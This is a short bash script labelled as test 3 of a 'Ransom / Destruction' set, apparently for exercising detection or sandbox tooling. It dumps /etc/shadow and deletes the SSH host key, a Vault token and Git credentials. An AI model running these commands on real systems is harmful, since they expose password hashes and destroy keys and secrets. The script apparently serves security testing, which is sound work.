#!/bin/bash
# ==========================================================
# [TEST 3] Ransom / Destruction (Deletion)
# Reads password hashes and deletes host keys & secrets
# ==========================================================
echo "[*] Exfiltrating and wiping security databases..."
cat /etc/shadow 2>/dev/null
rm -f /etc/ssh/ssh_host_rsa_key 2>/dev/null
rm -f /root/.vault-token 2>/dev/null
rm -f /root/.git-credentials 2>/dev/null
echo "[+] Wipe attempt complete."
